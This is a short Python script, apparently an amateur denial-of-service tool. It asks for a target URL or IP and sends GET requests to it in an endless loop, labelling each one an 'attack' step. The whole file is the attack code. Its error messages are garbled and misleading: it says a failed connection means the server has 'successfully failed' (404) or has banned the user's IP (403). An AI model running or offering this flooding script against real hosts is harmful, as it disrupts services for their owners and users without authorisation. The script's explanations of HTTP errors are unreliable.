#!/usr/bin/python3

import requests
import webbrowser

url=input('ENTER URL OR IP\n>>>')
i=0
d=''
while True:
	try:
		requests.get(url)
		print('attack '+str(i)+'-step: '+url)
	except:
		print("Request didn't connect to server. It means:\n 1)if error=404 it means that server have successfully failed.")
		input()
		print("2)if error=403 it means that server with sequrity and your ip was baned. Sorry.")
		input()
		print("do you want to check what mean?[y/n]")
		d=input()
		if(d=='y'):
			webbrowser.open(url)
		else:
			print('good bye my dear friend...')
		break
	i+=1
